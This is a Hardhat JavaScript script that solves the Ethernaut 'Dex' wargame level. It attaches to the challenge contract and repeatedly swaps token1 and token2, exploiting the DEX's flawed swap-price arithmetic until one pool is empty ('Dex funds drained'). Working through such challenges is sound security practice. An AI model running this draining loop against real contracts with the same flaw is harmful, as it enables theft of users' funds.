const { ethers } = require('hardhat');
const hre = require('hardhat');

async function main() {
  // Ethernaut level
  const dexContract = '0x49498F743221A8C9bB5Da63Aa3493834D485428A';
  const [deployer] = await ethers.getSigners();

  console.log('Deploying contracts with the account:', deployer.address);
  console.log('Account balance:', (await deployer.getBalance()).toString());

  const Dex = await ethers.getContractFactory('Dex', deployer);
  const dex = await Dex.attach(dexContract);

  const tokenAdd1 = await dex.token1();
  const tokenAdd2 = await dex.token2();
  const dexAdd = dex.address;
  await dex.connect(deployer).approve(dexAdd, 1000);

  while ((await dex.balanceOf(tokenAdd1, dexAdd)) != 0 && (await dex.balanceOf(tokenAdd2, dexAdd)) != 0) {
    const deployerToken1Balance = await dex.balanceOf(tokenAdd1, deployer.address);
    const deployerToken2Balance = await dex.balanceOf(tokenAdd2, deployer.address);
    console.log('Current amount of token1:', deployerToken1Balance);
    console.log('Current amount of token2:', deployerToken2Balance);
    console.log('-------------------------');
    if (deployerToken1Balance > deployerToken2Balance) {
      let price = await dex.getSwapPrice(tokenAdd1, tokenAdd2, deployerToken1Balance);
      if (price > (await dex.balanceOf(tokenAdd2, dexAdd))) {
        price = Math.floor(((await dex.balanceOf(tokenAdd2, dexAdd)) * deployerToken1Balance) / price);
      }
      const tx = await dex.swap(tokenAdd1, tokenAdd2, Math.min(price, deployerToken1Balance));
      await tx.wait();
    } else {
      let price = await dex.getSwapPrice(tokenAdd2, tokenAdd1, deployerToken2Balance);
      if (price > (await dex.balanceOf(tokenAdd1, dexAdd))) {
        price = Math.floor(((await dex.balanceOf(tokenAdd1, dexAdd)) * deployerToken2Balance) / price);
      }
      const tx = await dex.swap(tokenAdd2, tokenAdd1, Math.min(price, deployerToken2Balance));
      await tx.wait();
    }
  }

  console.log('Dex funds drained');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
